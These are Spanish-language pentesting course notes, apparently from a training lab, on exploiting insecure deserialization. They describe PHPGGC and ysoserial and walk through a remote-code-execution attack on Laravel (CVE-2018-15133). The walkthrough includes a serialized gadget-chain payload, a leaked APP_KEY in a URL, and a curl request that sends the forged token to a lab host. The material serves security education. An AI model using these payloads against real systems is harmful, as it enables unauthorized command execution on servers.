---
layout: apunte
title: "7. Automation Scripts"
---

Automatizar scripts durante el pentesting es esencial para identificar y explotar de manera eficiente las vulnerabilidades en aplicaciones web. En esta tarea exploraremos una herramienta llamada **PHP Gadge Chain (PHPGGC)** que juega un rol crucial en este proceso, automatizando el descubrimiento de vulnerabilidades de deserialización insegura.

--------------------------------------------------
<h2>PHP Gadget Chain (PHPGGC)</h2>
PHPGGC es una herramienta para generar cadenas de gadget usadas en los ataques de inyección de objetos PHP, específicamente diseñados para explotar vulnerabilidades relacionadas a la serialización y deserialización de objetos PHP.

<h4>Funcionalidad</h4>
- **Gadget Chains:** PHPGGC ofrece una librería de cadenas de gadget para varios frameworks y librerías PHP. Estas cadenas de gadgets son secuencias de objetos y métodos diseñados para explotar vulnerabilidades específicas cuando una aplicación PHP deserializa de forma insegura el input del usuario.
- **Payload Generation:** El propósito principal de PHPGGC es facilitar la generación de payloads serializados que pueden disparar estas vulnerabilidades. Ayuda a investigadores de ciberseguridad y pentesters a crear payloads que demuestren el impacto de las debilidades de deserialización.
- **Payload Customisation:** Los usuarios pueden personalizar payloads especificando argumentos para funciones o métodos involucrados en la cadena de gadgets, dirigiendo así el ataque para conseguir resultados específicos.

Puedes descargar PHPGGC desde su [repositorio de GitHub](https://github.com/ambionics/phpggc). Para listar todas las cadenas de gadgets disponibles puedes usar la opción `-l` con PHPGGC, lo que mostrará el nombre, versión tipo y vector para lanzar un ataque específico. Además, puedes filtrar cadenas de gadgets basado en sus capacidades, como aquellos que apuntan a frameworks PHP o técnicas específicos. Para hacer esto usa `-l` seguido de una palabra filtradora.

```bash
thm@machine$ php phpggc -l

Gadget Chains
-------------

NAME                                      VERSION                                                 TYPE                      VECTOR          I    
Bitrix/RCE1                               17.x.x <= 22.0.300                                      RCE: Command              __destruct           
CakePHP/RCE1                              ? <= 3.9.6                                              RCE: Command              __destruct           
CakePHP/RCE2                              ? <= 4.2.3                                              RCE: Command              __destruct           
CodeIgniter4/FD1                          <= 4.3.6                                                File delete               __destruct           
CodeIgniter4/FD2                          <= 4.3.7                                                File delete               __destruct           
CodeIgniter4/FR1                          4.0.0 <= 4.3.6                                          File read                 __toString      *    
CodeIgniter4/RCE1                         4.0.2                                                   RCE: Command              __destruct           
CodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.3.6                                     RCE: Command              __destruct           
CodeIgniter4/RCE3                         4.0.4 <= 4.4.3                                          RCE: Command              __destruct           
CodeIgniter4/RCE4                         4.0.0-beta.1 <= 4.0.0-rc.4                              RCE: Command              __destruct         
```

Por ejemplo, el output para `CakePHP/RCE1` significa que la cadena de gadget llamada `CakePHP/RCE1` explota una vulnerabilidad RCE en CakePHP en versiones hasta la `3.9.6`. Esta vulnerabilidad permite a los atacantes ejecutar comandos en el sercidor aprovechándose del método `__destruct`.

------------------------------------------
<h2>Explotar una Aplicación Web</h2>
Como pentesters, nos centramos en una web para explotar una vulnerabilidad conocida identificada bajo [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133). La vulnerabilidad es disparada cuando Laravel deserializa la información no confiable del `X-XSRF-TOKEN`. El proceso de deserialización puede llevar a ejecutar código arbitrario en el servidor si no se maneja con cautela. Los detalles em cuando a esta vulnerabilidad pueden leerse [aquí](https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30), pero nuestro foco principal será cómo podemos utilizar las cadenas de gadgets PHP durante la explotación. La vulnerabilidad arriba mencionada puede ser explotada usando 3 factores principales:

- **Paso 1:** Requiere `APP_KEY` de Laravel, el cual el framework usa para encriptar el token XSRF.
- **Paso 2:** Usa PHPGGC para generar un payload deserializado ejecutando un comando. Esto se considera una tarea compleja por lo que hay una herramienta que nos ayuda.
- **Paso 3:** Finalmente, debemos encriptar el payload usando `APPKEY` y mandar la petición POST. Esto normalmente varía de un framework a otro.

En esta tarea nuestro foco principal estará en el paso 2 y en entender cómo PHPGGC nos asistirá. Visita la aplicación vulnerable de Laravel en `http://IP:8089`. Podemos identificar las versiones de la aplicación mediante diferentes técnicas. La versión de este Laravel es la `5.6.29`.

!**Pasted image 20260121125547.png**

Ahora iremos al paso a paso detallado de la explotación.

- Para el primer paso, adquiriremos `APP_KEY` mediante un vector de ataque como ingeniería social. Puedes obtenerla en este ejemplo visitando `http://IP:8089/get-key`. Además esta página te dará el primer payload que tiene el comando `whoami`.
- Para el segundo paso tenemos que identificar el payload que podemos usar:

```bash
thm@machine$ php phpggc -l Laravel

Gadget Chains
-------------

NAME                  VERSION           TYPE             VECTOR    
Laravel/RCE1          5.4.27            rce              __destruct
Laravel/RCE2          5.5.39            rce              __destruct
Laravel/RCE3          5.5.39            rce              __destruct
Laravel/RCE4          5.5.39            rce              __destruct
```

Podemos generar el payload usando varios gadgets. Cada gadget tiene su relevancia y utiliza diferentes clases durante el proceso de deserialización. Usaremos RCE3 en este ejemplo y generaremos el payload usando el comando `php phpggc -b Laravel/RCE3 system whoami` para un payload base64 encodeado. Aquí abajo se muestra un payload no encodeado:

```bash
thm@machine$ php phpggc Laravel/RCE3 system whoami 
O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"*events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"*app";s:6:"whoami";s:17:"*defaultChannel";s:1:"x";s:17:"*customCreators";a:1:{s:1:"x";s:6:"assert";}}}
```

<h4>Desglose del Payload</h4>
- `Illuminate\Broadcasting\PendingBroadcast`: Esta clase maneja eventos broadcast en Laravel. Es principalmente un vehículo para llevar el objeto malicioso anidado.
- `Illuminate\Notifications\ChannelManager`: Este objeto maneja los canales de notificación. Lo manipulamos para inyectar ejecución de código arbitrario a través de sus propiedades, `*app`, la cual típicamente referenciaría el contenedor de servicio de la aplicación.Lo usamos mal intencionalmente para que acoja nuestro comando `whoami`. También manipulamos las propiedades `*defaultChannel` y `*customCreators` que están giradas para crear un escenario donde la función `assert` de PHP se llame, ejecutando el código pasado.

Como ya sabemos, Laraver empleó intencionalmente cookies encriptadas y serializadas para guardar de forma segura la información de sesión y token CSRF, usando la misma metodología para ambos. Si visitamos la app vulnerable, podemos ver las cookies encriptadas y serializadas.

!**Pasted image 20260121130737.png**

La idea básica es evitar la manipulación de información por parte de agentes maliciosos, pero no se dieron cuenta de que incluso un mecanismo de seguridad tan fuerte podría ser roto a través de serialización insegura.

Ahora que tenemos `APP_KEY` y el payload, es hora de crear un token CSRF encriptado. Para eso hemos preparado un script de PHP que toma la `APP_KEY` y el payload como argumentos y devuelve el token encriptado. Puedes acceder en el link [http://IP:8089/cve.php?app_key=xx&payload=xxx](http://IP:8089/cve.php?app_key=HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY%3D&payload=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6Njoid2hvYW1pIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0%3D). Para tu conveniencia, esta URL ya tiene la clave encodeada y el primer payload "**whoami**" incrustados.

Cuando pentesteamos frameworks web como Yii, CakePHP y Laravel, es esencial entender que cada framework tiene unos mecanismos de routing y encriptación únicos aunque se construyan todos en PHP. Estos frameworks se diseñan con diferentes arquitecturas e implementaciones de seguridad. Esto significa que ataques específicamente dirigidos hacia un framework no tienen por qué funcionar en otro.

Ahora que tenemos el token encriptado, podemos hacer una petición POST usando el token CSRF como se muestra debajo.

```bash
thm@machine$curl 10.66.163.248:8089 -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Im01dXZ0QXhrVm5iUHFOZWxCSnFINHc9PSIsInZhbHVlIjoiSWxhVDZZXC9cL0dyTTNLQVVsNVN6cGpFRXdYeDVqN1RcL3d0Umhtcnd2TzlVM1I5SnZ3OVdyeVFjU3hwbFwvS2dvaUF5ZlpTcW04eThxdXdQVWE5K08xSWU4Q1FWMG5GVjhlKzJkdEUwUnhXYXNuamFaWDI4bXFIZ1FaOHRWRGtVaE1EVGRxeE8xcGp0MWc0ZjNhMU5cL1BWdlQ0ZjdwdmRJWHRFYXR1YUUyNUNHTG0rRlNqWkxDSU9vSlI1MGhUNmtFQytpdnVmTnRlTVFNKzZhRDQ0amhBRXNGaUZMcmplMWdQajhINDBsY05sNis2d28rdktGNU04bklIdEUrVGczR3hseXQ0eEF4RjJoSU1oYXZVU3ZhSk1CUjlEKzZzaEdJRHk5RXlscjhOSUh5bjl0MitUeEx2Y281VTZUY29Ea0kyRiIsIm1hYyI6ImE1OGY2MjBhZThmYjdhMTgyMzA1M2IwNGExZmJkZTMzOTA2ZDBhMDI5N2Y3OWQzNDYwNzJjZTgyNjIzNmFhMTMifQ=='| head -n 2
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7245    0  7245    0     0  73181      0 --:--xxxx--:--:-- --:--:--     0
<!DOCTYPE html><!--
100 14485    0 14485    0     0   141k      0 --:--:-- --:--:-- --:--:--  140k
curl: (23) Failed writing body (947 != 7240)
```

----------------------------------------------
<h2>Ysoserial para Java</h2>Ysoserial es una herramienta de explotación ampliamente reconocida especialmente construída para comprobar la seguridad de aplicaciones Java contra vulnerabilidades de serialización. Ayuda a generar payloads que exploten estas vulnerabilidades.

Para usar Ysoserial, un ataccante deberia generar un payload con el comando `java -jar ysoserial.jar [tipo de payload] '[comando a ejecutar]'`. Por ejemplo, usando el tipo de payload `CommonsCollections1`: `java -jar ysoserial.jar CommonsCollections1 'calc.exe'`. Este comando genera un objeto serializado que ejecutará el comando especificado al ser deserializado. Puedes descargar Ysoserial en [Github](https://github.com/frohoff/ysoserial).

